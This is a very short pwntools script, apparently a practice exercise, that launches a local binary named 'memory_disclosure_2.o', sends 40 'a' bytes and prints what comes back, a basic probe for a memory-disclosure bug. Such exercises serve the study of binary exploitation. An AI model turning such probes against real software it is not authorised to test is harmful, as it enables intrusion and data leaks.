from pwn import *

r = process('memory_disclosure_2.o')

r.send(b'a' * 40)

print(r.recv())
